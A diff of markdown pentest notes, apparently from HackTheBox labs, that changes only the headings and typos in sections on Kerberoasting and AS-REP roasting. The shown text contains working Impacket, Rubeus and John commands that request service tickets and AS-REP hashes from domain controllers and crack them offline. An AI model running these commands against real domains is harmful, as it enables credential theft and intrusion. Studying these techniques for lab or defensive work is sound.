@@ -12,16 +12,16 @@ The KDC returns a TGS (TGS-REP) for the service in question to the user, which i
 ## Kerberoasting
 Kerberoasting is a technique for requesting TGS’s for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.
 
-Using [Impacket](https://github.com/SecureAuthCorp/impacket)
+### Using [Impacket](https://github.com/SecureAuthCorp/impacket)
 
-Attack carried from attacker machine.
+Attack carried out from attacker machine.
 ```markdown
 GetUserSPNs.py -request -dc-ip 10.129.x.x active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ```
 
-Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)
+### Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)
 
-Attack carried form target machine (upload the binary to target machine).
+Attack carried out form target machine (upload the binary to target machine).
 ```markdown
 .\Rubeus.exe kerberoast /simple /nowrap
 ```
@@ -42,7 +42,7 @@ john --format=krb5tgs --wordlist=wordlist hash.txt
 If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password. 
 
 
-Using [Impacket](https://github.com/SecureAuthCorp/impacket)
+### Using [Impacket](https://github.com/SecureAuthCorp/impacket)
 ```markdown
 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.129.1.165
 ```
@@ -54,7 +54,7 @@ for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.168.220 EG
 
 
 
-Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)
+### Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)
 ```markdown
 .\Rubeus.exe asreproast /user:fsmith /nowrap
 ```
